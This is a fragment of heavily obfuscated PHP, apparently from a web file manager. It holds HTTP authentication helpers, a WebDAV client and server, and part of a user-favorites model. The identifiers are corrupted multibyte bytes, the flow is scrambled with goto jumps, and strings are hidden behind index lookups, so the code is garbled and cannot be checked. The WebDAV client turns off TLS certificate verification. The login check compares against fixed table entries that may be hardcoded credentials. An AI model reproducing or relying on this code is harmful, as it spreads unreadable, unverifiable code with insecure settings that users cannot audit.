ÅÀ[33]; $a‰¬ğŠí… = isset($A½Ó…‡åŒî[1]) ? $A½Ó…‡åŒî[1] : 0; } } return array($còŞŠ¤ ÅÀ[536] => $AâğÈ®¼­, $còŞŠ¤ ÅÀ[899] => $a‰¬ğŠí…); } public static function error() { goto eä¢Ñ×—–; E¢’¼òÂÓ: header($B•ÚÇÚÅÓ³[1771]); header($B•ÚÇÚÅÓ³[1772]); header($B•ÚÇÚÅÓ³[1268]); goto EÒñùè£³è; EÒñùè£³è: die; goto E—ãøêÁ¬×; eä¢Ñ×—–: $B•ÚÇÚÅÓ³ =& $_SERVER[¦·]; header($B•ÚÇÚÅÓ³[1769]); header($B•ÚÇÚÅÓ³[1770]); goto E¢’¼òÂÓ; E—ãøêÁ¬×: } public static function make($d®§§Ê·©, $CèÁ¡µšÄ”) { $E¬İä¬…‡„ =& $_SERVER[¦·]; return $E¬İä¬…‡„[1773] + base64_encode($d®§§Ê·© . $E¬İä¬…‡„[4] . $CèÁ¡µšÄ”); } } class HttpDavClient { public function __construct($Aõ²Æ¹ÍÕò, $eë¯áÖ†‹Õ, $c’Åö¹Õ’¥) { $this->header = array(); $this->userName = $eë¯áÖ†‹Õ; $this->userPassowrd = $c’Åö¹Õ’¥; } protected function makePath($c£—­¿¿…) { return $c£—­¿¿…; } protected function setHeader($dõÇ´ø”Ö¡, $a¡Ëá†ìò† = false) { if ($a¡Ëá†ìò† === !1) { $this->header[] = $dõÇ´ø”Ö¡; } else { $this->header[] = $dõÇ´ø”Ö¡ . $_SERVER[¦·][882] . $a¡Ëá†ìò†; } } public function move($AƒÇƒƒ±­ß, $E‚¶¸Ç©æ¯, $a‘›„®Ì· = '') { $f¡î­Š´·  =& $_SERVER[¦·]; $this->setHeader($f¡î­Š´· [1774], $this->makePath($E‚¶¸Ç©æ¯)); $this->setHeader($f¡î­Š´· [1775], $f¡î­Š´· [1776]); if ($a‘›„®Ì·) { $this->setHeader($f¡î­Š´· [1777], $f¡î­Š´· [927] . $a‘›„®Ì· . $f¡î­Š´· [930]); } return $this->send($f¡î­Š´· [1778], $AƒÇƒƒ±­ß); } public function copy($A‰×áƒª§Ğ, $a¶ºäÓŸ¡É) { $BÃ¨é©Èô  =& $_SERVER[¦·]; $this->setHeader($BÃ¨é©Èô [1774], $this->makePath($a¶ºäÓŸ¡É)); $this->setHeader($BÃ¨é©Èô [1775], $BÃ¨é©Èô [1776]); return $this->send($BÃ¨é©Èô [1779], $A‰×áƒª§Ğ); } public function mkcol($bŒÙŒ³ö”°) { $b¾ô²î”ø¼ =& $_SERVER[¦·]; $this->setHeader($b¾ô²î”ø¼[1775], $b¾ô²î”ø¼[1776]); return $this->send($b¾ô²î”ø¼[1780], $bŒÙŒ³ö”°); } public function delete($A˜£ÍÑ´«, $b½—ÍÑì‚È = '') { $a®«íÊøÛ© =& $_SERVER[¦·]; if ($b½—ÍÑì‚È) { $this->setHeader($a®«íÊøÛ©[1777], $a®«íÊøÛ©[927] . $b½—ÍÑì‚È . $a®«íÊøÛ©[930]); } return $this->send($a®«íÊøÛ©[1256], $A˜£ÍÑ´«); } public function propfind($dù”¹½ñ ï) { $Céç¬õÉƒ‰ =& $_SERVER[¦·]; $this->setHeader($Céç¬õÉƒ‰[1781], $Céç¬õÉƒ‰[83]); $this->setHeader($Céç¬õÉƒ‰[1782], $Céç¬õÉƒ‰[1783]); $Cª¥ùÎŠÒ¶ = $Céç¬õÉƒ‰[1784]; return $this->send($Céç¬õÉƒ‰[1785], $dù”¹½ñ ï, $Cª¥ùÎŠÒ¶); } public function options($AìÙ‚ËÀï) { return $this->send($_SERVER[¦·][1786], $AìÙ‚ËÀï); } public function get($aâÅ§ŒŒÎ‹) { return $this->send($_SERVER[¦·][216], $aâÅ§ŒŒÎ‹); } public function put($AÒÎÕé¿í¡, $f¼°ë„¹¹Ú, $A’Â¹ËŠÛ = '') { $e½˜ÃÙ©†æ =& $_SERVER[¦·]; if ($A’Â¹ËŠÛ) { $this->setHeader($e½˜ÃÙ©†æ[1777], $e½˜ÃÙ©†æ[927] . $A’Â¹ËŠÛ . $e½˜ÃÙ©†æ[930]); } return $this->send($e½˜ÃÙ©†æ[214], $AÒÎÕé¿í¡, $f¼°ë„¹¹Ú); } protected function send($aˆ·«¨ÄÖ«, $bîÔˆ˜Øƒî, $BÛíÛÅ˜Ø = false, $D»°º³ë»‚ = false) { goto d»½Ä¡½”¦; Bæ‘ôˆ¬è©: curl_setopt($Cê”®…‘°‡, CURLOPT_HTTPHEADER, $this->header); curl_setopt($Cê”®…‘°‡, CURLOPT_RETURNTRANSFER, !0); curl_setopt($Cê”®…‘°‡, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto BÒÓÈá÷íã; aÆ¯˜‚ƒ˜í: $this->header = array(); return $d´öàä„°«; goto aéÁ»öˆ; aƒİÄí—„˜: $Cê”®…‘°‡ = curl_init($bîÔˆ˜Øƒî); curl_setopt($Cê”®…‘°‡, CURLOPT_CUSTOMREQUEST, $aˆ·«¨ÄÖ«); curl_setopt($Cê”®…‘°‡, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto Bæ‘ôˆ¬è©; d»½Ä¡½”¦: $e‡Èšä²ˆˆ =& $_SERVER[¦·]; $dÀŒ¬Åã× = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($e‡Èšä²ˆˆ[1787], $e‡Èšä²ˆˆ[50]); goto b£á†ŠÒ®; b£á†ŠÒ®: $this->setHeader($dÀŒ¬Åã×); if ($BÛíÛÅ˜Ø) { $BÛíÛÅ˜Ø = $e‡Èšä²ˆˆ[1788] . $BÛíÛÅ˜Ø; } if (!request_url_safe($bîÔˆ˜Øƒî)) { return !1; } goto aƒİÄí—„˜; BÒÓÈá÷íã: curl_setopt($Cê”®…‘°‡, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($Cê”®…‘°‡, CURLOPT_SSL_VERIFYHOST, !1); $d´öàä„°« = curl_exec($Cê”®…‘°‡); goto aÆ¯˜‚ƒ˜í; aéÁ»öˆ: } } class HttpDavServer { public function __construct($AÕÖÕ¹Ûğ…, $dˆïäÚ‚Õ) { $this->root = $AÕÖÕ¹Ûğ…; $this->initPath($dˆïäÚ‚Õ); $this->start(); } public function initPath($c ¸ĞÕ‘•) { $cÊÕŸÂ =& $_SERVER[¦·]; $cÎŠÆÊ¹ˆ‘ = rtrim($_SERVER[$cÊÕŸÂ[1392]], $cÊÕŸÂ[8]) . $cÊÕŸÂ[8]; $this->urlBase = substr($cÎŠÆÊ¹ˆ‘, 0, strpos($cÎŠÆÊ¹ˆ‘, $c ¸ĞÕ‘•) + 1); $this->urlBase = rtrim($this->urlBase, $cÊÕŸÂ[8]) . $c ¸ĞÕ‘•; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $D¥¦èÂĞ„ =& $_SERVER[¦·]; $c¯¸øƒÅ” = HttpAuth::get(); if ($c¯¸øƒÅ”[$D¥¦èÂĞ„[536]] == $D¥¦èÂĞ„[1789] && $c¯¸øƒÅ”[$D¥¦èÂĞ„[899]] == $D¥¦èÂĞ„[1790]) { return !0; } HttpAuth::error(); } public function start() { goto b‹ÃÔøäù; dŒÈíÒ™Ôù: if (!method_exists($this, $Bœ©Ñ°º˜‰)) { pr($Bœ©Ñ°º˜‰ . $C“×âŸ©é¨[1791]); die; } $f÷Ç¥·¨Ô¤ = array($C“×âŸ©é¨[1792], $C“×âŸ©é¨[1793]); if (!in_array($Bœ©Ñ°º˜‰, $f÷Ç¥·¨Ô¤) && !$this->pathExists($this->path)) { $f±¬ƒƒ—¨˜ = array($C“×âŸ©é¨[1035] => 404); } else { $f±¬ƒƒ—¨˜ = $this->{$Bœ©Ñ°º˜‰}(); } goto döŸÙ¤•Œ¯; b‹ÃÔøäù: $C“×âŸ©é¨ =& $_SERVER[¦·]; $this->checkUser(); $Bœ©Ñ°º˜‰ = $C“×âŸ©é¨[144] . HttpHeader::method(); goto dŒÈíÒ™Ôù; döŸÙ¤•Œ¯: if (!$f±¬ƒƒ—¨˜) { return; } self::response($f±¬ƒƒ—¨˜); goto Fââõõ””ì; Fââõõ””ì: } public function pathGet($c–­±§˜¸˜ = false) { $A‘íŒÚò¸ =& $_SERVER[¦·]; $e´›­·Ø¥± = $c–­±§˜¸˜ ? $_SERVER[$A‘íŒÚò¸[1794]] : $_SERVER[$A‘íŒÚò¸[1392]]; $e´›­·Ø¥± = KodIO::clear(rawurldecode($e´›­·Ø¥±)); if (!strstr($e´›­·Ø¥±, KodIO::clear($this->urlBase))) { return !1; } return substr($e´›­·Ø¥±, strpos($e´›­·Ø¥±, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($Aö±Ûö²šØ) { return file_exists($Aö±Ûö²šØ); } public function pathMkdir($b‚¢»øš¡…) { return mkdir($b‚¢»øš¡…, 511, !0); } public function pathInfo($bØ……Á›öØ) { return path_info($bØ……Á›öØ); } public function pathList($BÊáó¾íİÑ) { return path_list($BÊáó¾íİÑ); } public function pathOut($BÉ‚­¾–ù) { echo file_get_contents($BÉ‚­¾–ù); } public function pathPut($d‚ºŠÕÅ‡, $fä”‚‘êà” = '') { if (!$fä”‚‘êà”) { return file_put_contents($d‚ºŠÕÅ‡, $_SERVER[¦·][33]); } return move_path($fä”‚‘êà”, $d‚ºŠÕÅ‡); } public function pathRemove($F¸‚ø©í²ƒ) { if (is_file($F¸‚ø©í²ƒ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($c»ƒÛéµ‚‰, $dİÕ¥™ãÀò) { return move_path($c»ƒÛéµ‚‰, $dİÕ¥™ãÀò); } public function pathCopy($FÃ¤Ø§‰Œ, $b“£ƒ»«èÛ) { return copy_dir($FÃ¤Ø§‰Œ, $b“£ƒ»«èÛ); } public function parsePath($B†±±×ë‘) { return $B†±±×ë‘; } public function parseItem($aÓ¼…Ë“ò¼, $F¾®áØŸ“) { goto a§ªİƒ„ªÁ; a§ªİƒ„ªÁ: $d„³—ß‘Ø– =& $_SERVER[¦·]; $aåŒ‹¨ä”™ = $this->pathGet() . $d„³—ß‘Ø–[8] . $aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[28]]; $aåŒ‹¨ä”™ = $d„³—ß‘Ø–[8] . str_replace($d„³—ß‘Ø–[172], $d„³—ß‘Ø–[8], rawurlencode($aåŒ‹¨ä”™)); goto Dé¡ÙÎİÙî; Dé¡ÙÎİÙî: if ($F¾®áØŸ“) { $aåŒ‹¨ä”™ = $d„³—ß‘Ø–[8] . str_replace($d„³—ß‘Ø–[172], $d„³—ß‘Ø–[8], rawurlencode($this->pathGet())); } if (!trim($aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[107]])) { $aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[107]] = time(); } if (!trim($aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[187]])) { $aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[187]] = time(); } goto CŞğß…×ƒê; CŞğß…×ƒê: $B·™Å±Ö–œ = array($d„³—ß‘Ø–[1795] => KodIO::clear($this->urlBase . $aåŒ‹¨ä”™), $d„³—ß‘Ø–[107] => @gmdate($d„³—ß‘Ø–[1796], $aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[107]]), $d„³—ß‘Ø–[187] => @gmdate($d„³—ß‘Ø–[1797], $aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[187]]), $d„³—ß‘Ø–[77] => $aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[77]] ? $aÓ¼…Ë“ò¼[$d„³—ß‘Ø–[77]] : 0); return $B·™Å±Ö–œ; goto aƒÃ§†¢æ; aƒÃ§†¢æ: } public function parseItemXml($Eî¦ëŠ†ÙÊ, $Fé›ŞéµÓ) { $fÜñ³åë =& $_SERVER[¦·]; $c„Í‹¾Ï¼Ñ = $this->parseItem($Eî¦ëŠ†ÙÊ, $Fé›ŞéµÓ); if ($Eî¦ëŠ†ÙÊ[$fÜñ³åë[29]] == $fÜñ³åë[76]) { $DÏò˜°İ‡‡ = $fÜñ³åë[1798]; $DÏò˜°İ‡‡ .= $fÜñ³åë[1799]; } else { $b¤Û«Ú¡±à = $Eî¦ëŠ†ÙÊ[$fÜñ³åë[160]] ? $Eî¦ëŠ†ÙÊ[$fÜñ³åë[160]] : get_path_ext($Eî¦ëŠ†ÙÊ[$fÜñ³åë[28]]); $e‰ğ¸ÉËÌ½ = get_file_mime($b¤Û«Ú¡±à); $DÏò˜°İ‡‡ = $fÜñ³åë[1800]; $DÏò˜°İ‡‡ .= "\74\x44\72\147\145\x74\143\x6f\156\x74\145\x6e\164\x74\x79\160\x65\x3e{$e‰ğ¸ÉËÌ½}\x3c\57\x44\72\x67\145\164\143\x6f\156\x74\145\156\164\x74\x79\160\x65\x3e"; } return "\12\x9\x9\x3c\x44\72\x72\x65\x73\160\157\156\x73\145\76\12\x9\11\x9\74\x44\x3a\x68\x72\145\146\x3e{$c„Í‹¾Ï¼Ñ[$fÜñ³åë[1795]]}\x3c\x2f\x44\72\150\162\x65\x66\76\12\x9\x9\x9\74\104\x3a\160\x72\157\x70\x73\x74\x61\x74\76\xa\11\11\11\11\x3c\104\72\x70\x72\x6f\x70\76\xa\11\11\x9\11\11\74\104\x3a\x67\x65\164\154\x61\163\164\x6d\x6f\x64\x69\146\151\145\144\76{$c„Í‹¾Ï¼Ñ[$fÜñ³åë[107]]}\x3c\x2f\104\x3a\147\145\164\x6c\x61\163\x74\x6d\x6f\144\x69\146\x69\x65\144\x3e\12\x9\11\x9\x9\x9\x3c\104\72\x63\162\145\141\164\x69\157\x6e\x64\141\x74\145\x3e{$c„Í‹¾Ï¼Ñ[$fÜñ³åë[187]]}\74\57\x44\x3a\x63\162\x65\x61\x74\x69\157\x6e\144\x61\164\x65\x3e\xa\11\x9\x9\11\11\x3c\x44\x3a\x67\x65\164\x63\157\156\x74\x65\156\164\154\145\x6e\x67\x74\150\76{$c„Í‹¾Ï¼Ñ[$fÜñ³åë[77]]}\74\x2f\104\72\x67\x65\164\143\x6f\156\x74\x65\156\x74\154\145\x6e\x67\x74\x68\76\12\x9\11\x9\x9\11{$DÏò˜°İ‡‡}\xa\x9\11\11\x9\x3c\57\104\72\160\162\157\x70\76\xa\11\x9\11\11\74\x44\x3a\163\x74\x61\x74\165\163\x3e\x48\124\124\120\x2f\x31\x2e\61\40\x32\x30\60\x20\x4f\113\x3c\x2f\104\x3a\x73\x74\x61\x74\x75\163\x3e\12\x9\x9\11\x3c\57\104\x3a\x70\162\x6f\x70\x73\x74\x61\x74\76\12\x9\x9\74\57\104\x3a\162\x65\x73\160\157\156\163\145\76"; } public function pathListMerge($CõËĞöñÍÕ) { goto fŞ›­‰ÊÊò; fŞ›­‰ÊÊò: $e¿êÑËàø­ =& $_SERVER[¦·]; if (!$CõËĞöñÍÕ) { return $CõËĞöñÍÕ; } $a£¡‰¦Ÿí = array($e¿êÑËàø­[73], $e¿êÑËàø­[74], $e¿êÑËàø­[1801]); goto aôÚ±èæ; aôÚ±èæ: $f²îÍÙàó = array(); foreach ($CõËĞöñÍÕ as $aàÜÜ¹­ç¯ => $F°‚•ìÆ×) { if (!in_array($aàÜÜ¹­ç¯, $a£¡‰¦Ÿí) || !is_array($F°‚•ìÆ×)) { continue; } $f²îÍÙàó = array_merge($f²îÍÙàó, $F°‚•ìÆ×); } foreach ($f²îÍÙàó as &$eÚãŒÜö¯Ò) { $eÚãŒÜö¯Ò[$e¿êÑËàø­[28]] = str_replace($e¿êÑËàø­[8], $e¿êÑËàø­[1394], $eÚãŒÜö¯Ò[$e¿êÑËàø­[28]]); } goto cÃñ‰‚ ò; cÃñ‰‚ ò: unset($eÚãŒÜö¯Ò); return $f²îÍÙàó; goto bÇ‡¤ï¯È; bÇ‡¤ï¯È: } public function httpPROPFIND() { goto A•­¶İ·‹Á; fáÕƒÊ‡“ : if ($bíª…¨Û¬™) { $fÃŠ¡Ş³¯Ô = array($AöÀÚøùÈ¡); } else { $AöÀÚøùÈ¡[$d±½‡ãŒÑé[28]] = $d±½‡ãŒÑé[33]; $fÃŠ¡Ş³¯Ô = array_merge(array($AöÀÚøùÈ¡), $fÃŠ¡Ş³¯Ô); } $DÒƒˆÉ©Ø‘ = $d±½‡ãŒÑé[33]; foreach ($fÃŠ¡Ş³¯Ô as $EöåİŸõö ) { $DÒƒˆÉ©Ø‘ .= $this->parseItemXml($EöåİŸõö , $bíª…¨Û¬™); } goto B‘ôÁØæ•”; A¦±ÓˆÖÉø: $AöÀÚøùÈ¡ = $a¬Õ‘È‘¹Å[$d±½‡ãŒÑé[1802]]; if (!is_array($fÃŠ¡Ş³¯Ô) || $AöÀÚøùÈ¡[$d±½‡ãŒÑé[1803]] === !1) { return array($d±½‡ãŒÑé[1804] => 404, $d±½‡ãŒÑé[1805] => $d±½‡ãŒÑé[1806]); } $bíª…¨Û¬™ = $AöÀÚøùÈ¡[$d±½‡ãŒÑé[29]] == $d±½‡ãŒÑé[167] || HttpHeader::get($d±½‡ãŒÑé[1781]) == $d±½‡ãŒÑé[470]; goto fáÕƒÊ‡“ ; B‘ôÁØæ•”: return array($d±½‡ãŒÑé[1804] => 207, $d±½‡ãŒÑé[1805] => "\x3c\x44\x3a\155\x75\x6c\x74\x69\163\x74\141\x74\x75\x73\40\x78\155\x6c\156\x73\x3a\104\x3d\42\104\x41\126\72\42\76\12{$DÒƒˆÉ©Ø‘}\xa\x3c\x2f\104\x3a\x6d\165\154\x74\151\163\x74\141\164\x75\163\76"); goto cœ¦‰ùš¯ê; A•­¶İ·‹Á: $d±½‡ãŒÑé =& $_SERVER[¦·]; $a¬Õ‘È‘¹Å = $this->pathList($this->path); $fÃŠ¡Ş³¯Ô = $this->pathListMerge($a¬Õ‘È‘¹Å); goto A¦±ÓˆÖÉø; cœ¦‰ùš¯ê: } public function httpHEAD() { $eéö˜Š²¥ª =& $_SERVER[¦·]; $B òÌßäç = $this->pathInfo($this->path); if (!$B òÌßäç || $B òÌßäç[$eéö˜Š²¥ª[29]] == $eéö˜Š²¥ª[76]) { return array($eéö˜Š²¥ª[1035] => 200, $eéö˜Š²¥ª[1211] => array($eéö˜Š²¥ª[1807])); } return array($eéö˜Š²¥ª[1035] => 200, $eéö˜Š²¥ª[1211] => array($eéö˜Š²¥ª[1808], $eéö˜Š²¥ª[136], $eéö˜Š²¥ª[1809] . $B òÌßäç[$eéö˜Š²¥ª[77]], $eéö˜Š²¥ª[1810] . get_file_mime($B òÌßäç[$eéö˜Š²¥ª[160]]), $eéö˜Š²¥ª[132] . gmdate($eéö˜Š²¥ª[1796], $B òÌßäç[$eéö˜Š²¥ª[1259]]) . $eéö˜Š²¥ª[1811], $eéö˜Š²¥ª[1812])); } public function httpOPTIONS() { $FÒææ©´É¯ =& $_SERVER[¦·]; return array($FÒææ©´É¯[1035] => 200, $FÒææ©´É¯[1211] => array($FÒææ©´É¯[1813], $FÒææ©´É¯[1814], $FÒææ©´É¯[1815], $FÒææ©´É¯[1268])); } public function httpPROPPATCH() { $eÀÔ‰²ß§· =& $_SERVER[¦·]; $fÜèÉêğÔ = $eÀÔ‰²ß§·[1816] . $_SERVER[$eÀÔ‰²ß§·[1392]] . $eÀÔ‰²ß§·[1817]; return array($eÀÔ‰²ß§·[1804] => 207, $eÀÔ‰²ß§·[1805] => "\x3c\x44\x3a\x6d\165\x6c\x74\x69\x73\x74\x61\164\x75\x73\x20\x78\x6d\x6c\x6e\163\x3a\x44\75\x22\x44\x41\x56\72\x22\x3e\12{$fÜèÉêğÔ}\12\74\57\104\72\155\x75\x6c\x74\151\163\164\141\164\x75\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $cË¾Â¯†½ƒ =& $_SERVER[¦·]; $BùÏ‰›Ğ÷º = $this->uploadFile(); if ($BùÏ‰›Ğ÷º) { $a®Ì¯Í†—Ì = 204; } else { $BùÏ‰›Ğ÷º = $cË¾Â¯†½ƒ[33]; $a®Ì¯Í†—Ì = 201; } $d¹‡¸§ìéŠ = $this->pathPut($this->path, $BùÏ‰›Ğ÷º); if ($d¹‡¸§ìéŠ == !1) { $a®Ì¯Í†—Ì = 404; } return array($cË¾Â¯†½ƒ[1804] => $a®Ì¯Í†—Ì); } private function uploadFile() { goto dª«ÕØ™‚½; bß·õò²õ”: while (!feof($aµíîÎßŠ·)) { fwrite($DšÒ½Øá¤, fread($aµíîÎßŠ·, 1024 * 200)); } fclose($aµíîÎßŠ·); fclose($DšÒ½Øá¤); goto AÜÙº…½ìæ; D‡‘èÕèáğ: $DšÒ½Øá¤ = @fopen($c™Íáàİê, $bÎ‹‰Ò×ß—[1526]); $aµíîÎßŠ· = @fopen($bÎ‹‰Ò×ß—[1819], $bÎ‹‰Ò×ß—[1525]); if (!$aµíîÎßŠ· || !$DšÒ½Øá¤) { @unlink($c™Íáàİê); return !1; } goto bß·õò²õ”; dª«ÕØ™‚½: $bÎ‹‰Ò×ß— =& $_SERVER[¦·]; @mk_dir(TEMP_FILES); $c™Íáàİê = TEMP_FILES . $bÎ‹‰Ò×ß—[1818] . rand_string(32); goto D‡‘èÕèáğ; AÜÙº…½ìæ: if (@filesize_64($c™Íáàİê) > 0) { return $c™Íáàİê; } @unlink($c™Íáàİê); return !1; goto a«Êä®®¯´; a«Êä®®¯´: } public function httpMKCOL() { $E÷“¡¿®Ë =& $_SERVER[¦·]; if ($this->pathExists($this->path)) { return array($E÷“¡¿®Ë[1035] => 409); } $EËÇ‡¸Üì¢ = $this->pathMkdir($this->path); return array($E÷“¡¿®Ë[1035] => $EËÇ‡¸Üì¢ ? 201 : 403); } public function httpMOVE() { $f¸÷‡Æœšï =& $_SERVER[¦·]; $eæÃ¬Ÿ•’Ç = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$f¸÷‡Æœšï[1820]])) { $e…–Á¦öŠ[$f¸÷‡Æœšï[1821]] = $_SERVER[$f¸÷‡Æœšï[1820]] == $f¸÷‡Æœšï[1822]; } $a¿«İº±¥³ = $this->pathMove($this->path, $eæÃ¬Ÿ•’Ç); return array($f¸÷‡Æœšï[1035] => $a¿«İº±¥³ ? 201 : 404); } public function httpCOPY() { $f¨Ã›Ü®¿Ò = $this->parsePath($this->pathGet(!0)); $dáÎÈß©¤ = $this->pathCopy($this->path, $f¨Ã›Ü®¿Ò); return array($_SERVER[¦·][1035] => $dáÎÈß©¤ ? 201 : 404); } public function httpDELETE() { $bàºÂÊ¤šß = $this->pathRemove($this->path); return array($_SERVER[¦·][1035] => $bàºÂÊ¤šß ? 200 : 503); } public function httpLOCK() { $CğÄ Œ™ìƒ =& $_SERVER[¦·]; $AÌÁêäÈ¸² = md5($this->path); $AŞ·ŒëŠ— = $CğÄ Œ™ìƒ[1823] . $this->xmlGet($CğÄ Œ™ìƒ[1824]) . $CğÄ Œ™ìƒ[1825] . $AÌÁêäÈ¸² . $CğÄ Œ™ìƒ[1826]; return array($CğÄ Œ™ìƒ[1035] => 200, $CğÄ Œ™ìƒ[1211] => array($CğÄ Œ™ìƒ[1827] . $AÌÁêäÈ¸², $CğÄ Œ™ìƒ[1828]), $CğÄ Œ™ìƒ[1829] => $AŞ·ŒëŠ—); } public function httpUNLOCK() { return array($_SERVER[¦·][1035] => 204); } public function xmlGet($fÔùŒ¾¨ÑØ) { goto cÔØ‹±¹À¥; D©…²êÃ†Ó: if ($Cà¢ÏÜÙÃé) { return $Cà¢ÏÜÙÃé[0]->nodeValue; } return $D´™Ú£øÏ[33]; goto C‘™‰’·°; FŠ„Ïñ™: $bÈÉÂ«ñ× = explode($D´™Ú£øÏ[8], $fÔùŒ¾¨ÑØ); $F®İ®“ë¤ = array_shift($bÈÉÂ«ñ×); $Cà¢ÏÜÙÃé = $AŒ Ç ¬Ò¹->getElementsByTagNameNS($D´™Ú£øÏ[1831], $F®İ®“ë¤); goto D©…²êÃ†Ó; cÔØ‹±¹À¥: $D´™Ú£øÏ =& $_SERVER[¦·]; static $AŒ Ç ¬Ò¹ = false; if (!$AŒ Ç ¬Ò¹) { $e™æ¡ŠÔšà = file_get_contents($D´™Ú£øÏ[1830]); $AŒ Ç ¬Ò¹ = new DOMDocument(); $AŒ Ç ¬Ò¹->loadXML($e™æ¡ŠÔšà); } goto FŠ„Ïñ™; C‘™‰’·°: } public static function response($cÈÄäŠ•èò) { goto Fô©Õ„Æ; AŸùÉ¾«õ‹: $D«È¸‚‡Ò[] = $F’ÍÎÌ‡Şì[1771]; $D«È¸‚‡Ò[] = $F’ÍÎÌ‡Şì[1772]; foreach ($D«È¸‚‡Ò as $Dæ™øëÕß–) { header($Dæ™øëÕß–); } goto b½Ï ùôÚ; b½Ï ùôÚ: if (is_string($cÈÄäŠ•èò[$F’ÍÎÌ‡Şì[1829]])) { header($F’ÍÎÌ‡Şì[1832]); $AÅÒ²‡¢¿» = $F’ÍÎÌ‡Şì[1833] . $F’ÍÎÌ‡Şì[217] . $cÈÄäŠ•èò[$F’ÍÎÌ‡Şì[1829]]; echo $AÅÒ²‡¢¿»; } goto aÍ¼ÎŸÕ•˜; Fô©Õ„Æ: $F’ÍÎÌ‡Şì =& $_SERVER[¦·]; $D«È¸‚‡Ò = is_array($cÈÄäŠ•èò[$F’ÍÎÌ‡Şì[1211]]) ? $cÈÄäŠ•èò[$F’ÍÎÌ‡Şì[1211]] : array(); $D«È¸‚‡Ò[] = HttpHeader::code($cÈÄäŠ•èò[$F’ÍÎÌ‡Şì[1035]]); goto AŸùÉ¾«õ‹; aÍ¼ÎŸÕ•˜: } } goto cøŠ·à¸»ø; e¢ÆÃŒŠáÉ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($DàØ…÷£–‹) { $e§¼ªó†ö‹ =& $_SERVER[¦·]; return array($e§¼ªó†ö‹[2208] => array(USER_ID, $e§¼ªó†ö‹[2523])); } protected function listData() { $f³á½ÒˆĞÍ =& $_SERVER[¦·]; $FˆôÒ’Ãƒª = array($f³á½ÒˆĞÍ[1432] => USER_ID, $f³á½ÒˆĞÍ[436] => 0); $a´â‰âŸŸ = $f³á½ÒˆĞÍ[2524]; $C£ÚåùÖ„ = $this->field($a´â‰âŸŸ)->where($FˆôÒ’Ãƒª)->order($f³á½ÒˆĞÍ[2525])->select(); return $C£ÚåùÖ„ ? $C£ÚåùÖ„ : array(); } protected function resetCache() { } protected function listView() { goto fÀÈ¿Àò; AÀ¾Ë‡÷¤Î: $D‡òŒ°Ìì = array_to_keyvalue($D‡òŒ°Ìì, $DĞÀ™¸‚Í[369]); foreach ($B‡ ×Ä”ÙÚ as $DÔĞÆÏ¬ïŸ => $bÅîãÜÙâ¨) { $EÍÍ™‹Ä·Ü = $D‡òŒ°Ìì[$bÅîãÜÙâ¨[$DĞÀ™¸‚Í[75]]]; $EÍÍ™‹Ä·Ü = $EÍÍ™‹Ä·Ü ? $EÍÍ™‹Ä·Ü : array(); $B‡ ×Ä”ÙÚ[$DÔĞÆÏ¬ïŸ] = array_merge($EÍÍ™‹Ä·Ü, $bÅîãÜÙâ¨); } return $B‡ ×Ä”ÙÚ; goto c«ê²±Ï´Š; fÀÈ¿Àò: $DĞÀ™¸‚Í =& $_SERVER[¦·]; $B‡ ×Ä”ÙÚ = $this->listData(); $d±Æâ•ò¶ = array_filter_by_field($B‡ ×Ä”ÙÚ, $DĞÀ™¸‚Í[29], $DĞÀ™¸‚Í[382]); goto Eù‘¸Ìó; Eù‘¸Ìó: $fÜŞ¬‘Ù¿ = array_to_keyvalue($d±Æâ•ò¶, $DĞÀ™¸‚Í[33], $DĞÀ™¸‚Í[75]); if (!$fÜŞ¬‘Ù¿) { return $B‡ ×Ä”ÙÚ; } $Fµğ´ŠÈ‹ˆ = 2000; goto Eê¿™Å Ê·; Eê¿™Å Ê·: $C½Å“è¡Ä = array($DĞÀ™¸‚Í[383] => array($DĞÀ™¸‚Í[384], $fÜŞ¬‘Ù¿)); $D‡òŒ°Ìì = Model($DĞÀ™¸‚Í[753])->listSource($C½Å“è¡Ä, $Fµğ´ŠÈ‹ˆ); $D‡òŒ°Ìì = array_merge($D‡òŒ°Ìì[$DĞÀ™¸‚Í[73]], $D‡òŒ°Ìì[$DĞÀ™¸‚Í[74]]); goto AÀ¾Ë‡÷¤Î; c«ê²±Ï´Š: } protected function addFav($bÌÚçáÄ Â, $e°–ºøºÃ = '', $EÛ¯ê‡§“š = "\x73\x6f\165\162\143\x65") { goto cìĞÔ¨‘«ñ; Aé˜Ì®¡—â: $e†â¨«ĞŞ = array($e°õó«å´“[1432] => USER_ID, $e°õó«å´“[436] => 0); $B ŒÉ¼­°¢ = $this->where($e†â¨«ĞŞ)->max($e°õó«å´“[2134]); if (!$B ŒÉ¼­°¢) { $B ŒÉ¼­°¢ = 0; } goto bàÖÙ‚ïçƒ; A²ø¢æ¢À‹: return $this->add($aõÉ§­õĞÔ); goto D¾èÚšİ¾Œ; cìĞÔ¨‘«ñ: $e°õó«å´“ =& $_SERVER[¦·]; $e†â¨«ĞŞ = array($e°õó«å´“[1432] => USER_ID, $e°õó«å´“[436] => 0, $e°õó«å´“[388] => $EÛ¯ê‡§“š, $e°õó«å´“[387] => $bÌÚçáÄ Â); if ($this->where($e†â¨«ĞŞ)->find()) { return !1; } goto Aé˜Ì®¡—â; bàÖÙ‚ïçƒ: if (!$e°–ºøºÃ && $EÛ¯ê‡§“š == $e°õó«å´“[382]) { $b†õˆ»åªİ = Model($e°õó«å´“[1122])->where(array($e°õó«å´“[383] => $bÌÚçáÄ Â))->find(); if (!$b†õˆ»åªİ) { return !1; } $e°–ºøºÃ = $b†õˆ»åªİ[$e°õó«å´“[28]]; } 